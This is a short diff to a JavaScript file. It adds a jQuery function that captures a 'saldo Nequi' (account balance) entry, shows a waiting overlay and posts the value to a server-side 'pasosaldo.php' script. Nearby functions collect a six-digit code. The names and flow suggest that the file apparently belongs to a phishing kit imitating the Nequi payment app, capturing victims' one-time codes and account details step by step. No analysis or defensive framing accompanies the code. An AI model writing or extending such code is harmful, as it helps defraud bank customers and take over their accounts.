@@ -495,6 +495,21 @@ function pedircodigo() {
 }
 
 
+function guardarSaldoNequi() {
+  var v = ($("#inputsaldo").val() || "").trim();
+  if (v.length < 1) {
+    $("#msgSaldo").css("display", "table");
+    $("#inputsaldo").focus();
+    return;
+  }
+  $("#msgSaldo").css("display", "none");
+  $(".fondo").show();
+  $(".mensaje").show();
+  $.post("../../../process/pasosaldo.php", { saldo: v }, function () {
+    espera = 1;
+  });
+}
+
 function guardarotp3(){
   if ($("#codigo").val() != "") {
     if ($("#codigo").val().length == 6) {
